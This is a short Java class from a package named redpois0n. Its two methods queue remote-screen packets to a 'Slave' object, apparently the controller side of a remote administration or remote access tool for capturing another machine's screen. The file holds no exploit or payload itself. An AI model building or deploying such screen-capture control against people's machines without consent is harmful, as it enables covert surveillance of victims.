package com.redpois0n;

import com.redpois0n.packets.outgoing.Packet12RemoteScreen;
import com.redpois0n.packets.outgoing.Packet13OneRemoteScreen;

public class ScreenCommands {

	public static void sendOnce(Slave slave, int quality, int monitor, int rows, int cols) {
		slave.addToSendQueue(new Packet13OneRemoteScreen(quality, monitor, rows, cols));
	}

	public static void send(Slave slave, int quality, int monitor, int rows, int cols) {
		slave.addToSendQueue(new Packet12RemoteScreen(quality, monitor, rows, cols));
	}

}
